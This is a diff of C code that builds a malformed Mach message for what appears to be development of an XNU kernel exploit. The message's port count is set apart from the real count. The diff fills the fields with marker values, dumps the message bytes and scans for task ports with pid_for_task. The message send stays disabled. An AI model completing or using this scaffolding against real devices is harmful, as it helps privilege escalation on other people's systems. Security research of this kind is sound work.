@@ -199,20 +199,23 @@ int main(int argc, char* argv[]) {
     Request *InP = &Mess.In;
     Reply *OutP = &Mess.Out;
 
-#if 0
     InP->msgh_body.msgh_descriptor_count = 1;
-    InP->init_port_set.address = (void*)(init_port_set);
-    InP->init_port_set.count = real_count;
+    InP->init_port_set.address = (void*)(0x41414141);
+    InP->init_port_set.count = 0x42424242;
     InP->init_port_set.disposition = 19;
     InP->init_port_set.deallocate =  FALSE;
     InP->init_port_set.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
     InP->NDR = NDR_record;
-    InP->init_port_setCnt = fake_count; // was real_count
+    InP->init_port_setCnt = 0x43434343; // was real_count
     InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    InP->Head.msgh_remote_port = task;
-    InP->Head.msgh_local_port = mig_get_local_port();
+    InP->Head.msgh_remote_port = 0x45454545;
+    InP->Head.msgh_local_port = 0x69696969;
     InP->Head.msgh_id = 3403;
-#endif
+
+    for (int i = 0; i < 0x100; i++) {
+        printf("%02x", ((uint8_t*)InP)[i]);
+    }
+    printf("\n");
 
     printf("    InP->msgh_body.msgh_descriptor_count  %p %p\n", ((void*)&    InP->msgh_body.msgh_descriptor_count ) - ((void*)InP), sizeof(    InP->msgh_body.msgh_descriptor_count ));
     printf("    InP->init_port_set.address  %p %p\n", ((void*)&    InP->init_port_set.address ) - ((void*)InP), sizeof(    InP->init_port_set.address ));
@@ -254,6 +257,15 @@ typedef struct {
     uintptr_t *ptraaa = (uintptr_t*)(kportaaa + 1);
 
     printf("%p\n", ((void*)ptraaa) - ((void*)kportaaa));
+
+    printf("===validity check\n");
+
+    uintptr_t whatever;
+
+    for (mach_port_t i = 0; i < 0x1000000; i++) {
+        if (pid_for_task(i, &whatever) == KERN_SUCCESS)
+            printf("0x%x\n", i);
+    }
 
 #if 0
     kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
